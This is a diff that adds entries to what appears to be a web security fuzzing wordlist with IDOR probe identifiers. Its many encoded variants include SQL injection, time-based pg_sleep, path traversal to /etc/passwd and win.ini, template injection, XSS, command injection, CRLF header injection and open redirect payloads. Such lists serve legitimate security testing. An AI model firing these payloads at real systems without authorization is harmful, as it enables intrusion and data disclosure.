@@ -78,3 +78,165 @@ HTTPS://EXAMPLE.COM
 %2FAPI
 %2FAPI%2FV1
 %2FSTATUS
+1
+1?aurose=1
+1&aurose=1
+2
+2?aurose=1
+2&aurose=1
+99999
+99999?aurose=1
+99999&aurose=1
+0001
+0001?aurose=1
+0001&aurose=1
+user-1
+USER-1
+user-1?aurose=1
+user-1&aurose=1
+account-1
+ACCOUNT-1
+account-1?aurose=1
+account-1&aurose=1
+invoice-2024-0001
+INVOICE-2024-0001
+invoice-2024-0001?aurose=1
+invoice-2024-0001&aurose=1
+profile?id=1
+profile%3Fid%3D1
+profile%253Fid%253D1
+profile?id%3d1
+PROFILE?ID=1
+profile?id=1?aurose=1
+profile?id=1&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+1::var0
+1::v0
+/idor/probe/0
+2::var1
+2::v1
+/idor/probe/1
+99999::var2
+99999::v2
+/idor/probe/2
+0001::var3
+0001::v3
+/idor/probe/3
+user-1::var4
+user-1::v4
+/idor/probe/4
+account-1::var5
+account-1::v5
+/idor/probe/5
+invoice-2024-0001::var6
+invoice-2024-0001::v6
+/idor/probe/6
+profile?id=1::var7
+profile%3Fid%3D1::v7
+/idor/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/idor/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/idor/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/idor/probe/10
+' AND 1=2 --::var11
+%27%20AND%201%3D2%20--::v11
+/idor/probe/11
+../../../../etc/passwd::var12
+..%2F..%2F..%2F..%2Fetc%2Fpasswd::v12
+/idor/probe/12
+..\..\..\..\windows\win.ini::var13
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini::v13
+/idor/probe/13
+${7*7}::var14
+%24%7B7%2A7%7D::v14
+/idor/probe/14
+{{7*7}}::var15
+%7B%7B7%2A7%7D%7D::v15
+/idor/probe/15
+<script>alert(document.domain)</script>::var16
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E::v16
+/idor/probe/16
+';SELECT pg_sleep(2)--::var17
+%27%3BSELECT%20pg_sleep%282%29--::v17
+/idor/probe/17
